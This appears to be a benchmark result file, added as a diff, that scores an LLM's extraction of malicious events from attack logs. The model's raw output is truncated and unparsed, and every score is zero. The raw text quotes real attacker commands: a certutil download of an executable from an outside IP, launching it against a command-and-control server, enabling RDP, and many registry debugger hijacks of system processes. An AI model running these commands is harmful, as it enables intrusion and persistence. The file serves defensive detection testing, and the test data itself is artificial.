@@ -1,0 +1,44 @@
+{
+  "output": {
+    "malicious_events": [],
+    "narrative": "",
+    "_parse_ok": false,
+    "_cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 16543,
+      "completion_tokens": 1536,
+      "total_tokens": 18079,
+      "wall_clock_s": 31.421,
+      "parse_retries": 1
+    },
+    "_raw_text": "{\n  \"malicious_events\": [\n    {\"command\": \"certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\\\Users\\\\Public\\\\agent.exe\", \"stage\": \"Defense Evasion\"},\n    {\"command\": \"certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\\\Users\\\\Public\\\\agent.exe\", \"stage\": \"Persistence\"},\n    {\"command\": \"start /min C:\\\\Users\\\\Public\\\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443\", \"stage\": \"Command and Control\"},\n    {\"command\": \"del /f /q PhpStudyPoc.py\", \"stage\": \"Collection\"},\n    {\"command\": \"del /f /q PhpStudyExp2.py\", \"stage\": \"Collection\"},\n    {\"command\": \"del /f /q WinBrute.exe\", \"stage\": \"Collection\"},\n    {\"command\": \"del /f /q nbtscan.exe\", \"stage\": \"Collection\"},\n    {\"command\": \"del /f /q PAExec.exe\", \"stage\": \"Collection\"},\n    {\"command\": \"reg add \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\", \"stage\": \"Privilege Escalation\"},\n    {\"command\": \"reg add \\\"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\sethc.exe\\\" /v Debugger /t REG_SZ /d \\\"C:\\\\windows\\\\system32\\\\cmd.exe\\\"\", \"stage\": \"Privilege Escalation\"},\n    {\"command\": \"reg add \\\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\sethc.exe\\\" /v Debugger /t REG_SZ /d C:\\\\windows\\\\system32\\\\cmd.exe /f\", \"stage\": \"Privilege Escalation\"},\n    {\"command\": \"reg add \\\"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\sethc.exe\\\" /v Debugger /t REG_SZ /d \\\\\\\"C:\\\\windows\\\\system32\\\\sethc.exe\\\\\\\"\", \"stage\": \"Privilege Escalation\"},\n    {\"command\": \"reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\sethc.exe /v Debugger /t REG_SZ /d C:\\\\windows\\\\system32\\\\sethc.exe /f\", \"stage\": \"Privilege Escalation\"},\n    {\"command\": \"reg delete HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\sethc.exe /v Debugger /f\", \"stage\": \"Privilege Escalation\"},\n    {\"command\": \"reg delete HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\sethc.exe /v Debugger /f\", \"stage\": \"Privilege Escalation\"},\n    {\"command\": \"reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\csrss.exe /v Debugger /t REG_SZ /d C:\\\\windows\\\\system32\\\\cmd.exe /f\", \"stage\": \"Privilege Escalation\"},\n    {\"command\": \"reg add HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\csrss.exe /v Debugger /t REG_SZ /d C:\\\\windows\\\\system32\\\\cmd.exe\", \"stage\": \"Privilege Escalation\"},\n    {\"command\": \"reg delete HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\csrss.exe /v Debugger /f\", \"stage\": \"Privilege Escalation\"},\n    {\"command\": \"reg add HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\wininit.exe /v Debugger /t REG_SZ /d C:\\\\windows\\\\system32\\\\cmd.exe\", \"stage\": \"Privilege Escalation\"},\n    {\"command\": \"reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\wininit.exe /v Debugger /t REG_SZ /d C:\\\\windows\\\\system32\\\\cmd.exe /f\", \"stage\": \"Privilege Escalation\"},\n    {\"command\": \"reg delete HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\wininit.exe /v Debugger /f\", \"stage\": \"Privilege Escalation\"},\n    {\"command\": \"reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\\\\\services.exe /v Debugger /t REG_SZ /d C:\\\\windows\\\\system32\\\\cmd.exe /f\", \"stage\": \"Privilege Escalation\"},\n    {\"command\": \"reg add HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\services.exe /v Debugger /t REG_SZ /d C:\\\\windows\\\\system32\\\\cmd.exe\", \"stage\": \"Privilege Escalation\"},\n    {\"command\": \"reg delete HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\services.exe /v Debugger /f\", \"stage\": \"Privilege Escalation\"},\n    {\"command\": \"reg add HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\lsass.exe /v Debugger /t REG_SZ /d C:\\\\windows\\\\system32\\\\cmd.exe\", \"stage\": \"Privilege Escalation\"},\n    {\"command\": \"reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\lsass.exe /v Debugger /t REG_SZ /d C:\\\\windows\\\\system32\\\\cmd.exe /f\", \"stage\": \"Privilege Escalation\"},\n    {\"command\": \"reg delete HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\lsass.exe /v Debugger /f\", \"stage\": \"Privilege Escalation\"},\n    {\"command\": \"reg add HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\smss.exe /v Debugger /t REG_SZ /d C:\\\\windows\\\\system32\\\\cmd.exe\", \"stage\": \"Privilege Escalation\"},\n    {\"command\": \"reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\smss.exe /v Debugger /t REG_SZ /d C:\\\\windows\\\\system32\\\\cmd.exe /f\", \"stage\": \"Privilege Escalation\"},\n    {\"command\": \"reg delete HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\smss.exe /v Debugger /f\", \"stage\": \"Privilege Escalation\"},\n    {\"command\": \"reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\csrss.exe /v Debugger /t REG_SZ /d C:\\\\windows\\\\system32\\\\cmd.exe /f\", \"stage\": \"Privilege Escalation\"},\n    {\"command\": \"reg"
+  },
+  "score": {
+    "event": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 0,
+      "fn": 6
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 0,
+      "fn": 6,
+      "recall_partial": 0.0
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 1,
+      "prompt_tokens": 16543,
+      "completion_tokens": 1536,
+      "total_tokens": 18079,
+      "wall_clock_s": 31.421,
+      "parse_retries": 1
+    }
+  }
+}
